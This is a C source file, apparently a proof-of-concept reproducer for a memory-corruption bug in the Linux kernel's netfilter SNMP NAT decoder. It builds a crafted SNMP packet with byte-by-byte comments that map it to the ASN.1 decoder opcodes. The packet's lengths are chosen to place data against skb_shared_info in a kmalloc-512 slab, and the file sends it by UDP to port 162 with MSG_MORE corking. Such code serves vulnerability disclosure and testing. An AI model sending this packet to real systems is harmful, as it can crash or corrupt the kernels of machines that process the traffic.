/* gcc -o udp_repro udp_repro.c -Wall */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <stdlib.h>
#include <errno.h>
#include <stdarg.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/in.h>
#include <err.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

#define IPADDR(a,b,c,d) (((a)<<0)+((b)<<8)+((c)<<16)+((d)<<24))

// "pc X" comments in the following array refer to indices into
// nf_nat_snmp_basic_machine in "nf_nat_snmp_basic.asn1.c", which
// is generated as part of the kernel's build process.
// reading the ASN.1 decoder and the generated machine opcodes
// seemed easier than trying to build ASN.1 by looking at the
// spec or something like that...
uint8_t snmp_packet[] = {
  // pc 0: read tag, should match _tag(UNIV, CONS, SEQ) == 0x30
  // length indef
  0x30, 0x80,

  // pc 2: read tag, should match _tag(UNIV, PRIM, INT) == 0x02
  // version number
  0x02, 0x01,
  0x00,

  // pc 5: read tag, should match _tag(UNIV, PRIM, OTS) == 0x04
  0x04, 0x00,

  // pc 7: read tag, should match _tagn(CONT, CONS,  0) == 0xa0
  // selects GetRequest-PDU, length indef
  0xa0, 0x80,

  // pc 34: read INT request-id
  0x02, 0x04,
  0x00, 0x00, 0x00, 0x00,

  // pc 36: read INT error-status
  0x02, 0x04,
  0x00, 0x00, 0x00, 0x00,

  // pc 38: read INT error-index
  0x02, 0x04,
  0x00, 0x00, 0x00, 0x00,

  // pc 40: read seq VarBindList
  // length indef
  0x30, 0x80,

  // pc 42: read seq VarBind
  // length indef
  0x30, 0x80,

  // ptr 44: read tag, should match _tag(UNIV, PRIM, OID) == 0x06
  // ObjectName
  // (can use 0x82 as length to have two bytes of length following)
  // length chosen so that the end of packet data is directly
  // followed by the skb_shared_info, with the whole thing in a
  // kmalloc-512 slab.
  0x06, 0x70,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,

  // ptr 46: read tag, should skip
  // ptr 48: read tag, should skip
  // ptr 50: read tag, should skip
  // ptr 52: read tag, should match _tagn(APPL, PRIM,  0) == 0x40
  // IpAddress
  // we could also use a length of zero, and the callback would still
  // be invoked, but we want control over the first byte so that we
  // can create a source IP match.
  0x40, 0x01,
  // source IP 10.0.0.0
  0x0a
};

void do_sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen) {
  int res = sendto(sockfd, buf, len, flags, dest_addr, addrlen);
  if (res != len) {
    if (res == -1)
      return;
    else
      return;
  }
}

int main(void) {
  int sock = socket(AF_INET, SOCK_DGRAM, 0);

  struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(162), .sin_addr = { .s_addr = IPADDR(192,168,0,2) } };

  // __ip_append_data() overallocates by 15 bytes for some reason; cancel it out
  // by using CORK to first send 15 bytes short, then append the remaining 15 bytes
  do_sendto(sock, snmp_packet, sizeof(snmp_packet)-15, MSG_MORE, (struct sockaddr *)&sa, sizeof(sa));
  do_sendto(sock, ((char*)snmp_packet)+sizeof(snmp_packet)-15, 15, 0, (struct sockaddr *)&sa, sizeof(sa));
}